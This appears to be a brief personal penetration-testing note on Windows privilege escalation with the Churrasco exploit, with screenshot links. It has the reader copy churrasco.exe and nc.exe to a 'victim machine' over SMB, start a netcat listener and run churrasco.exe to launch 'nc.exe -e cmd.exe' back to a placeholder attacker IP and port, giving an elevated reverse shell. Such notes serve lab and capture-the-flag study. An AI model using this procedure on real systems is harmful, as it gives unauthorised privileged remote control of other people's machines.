transfer the churrasco.exe and nc.exe over to the victim machine using smb
- see file transfer notes
  
![[../../../assets/Privilege Escalation with Churrasco/image 429.png|image 429.png]]
  
create a netcat listener, then run the following command
- ./churrasco.exe -d “C:\location_for\nc.exe -e cmd.exe <attacker_ip> <attacker_port>”
![[/image 7 51.png|image 7 51.png]]
![[/image 8 48.png|image 8 48.png]]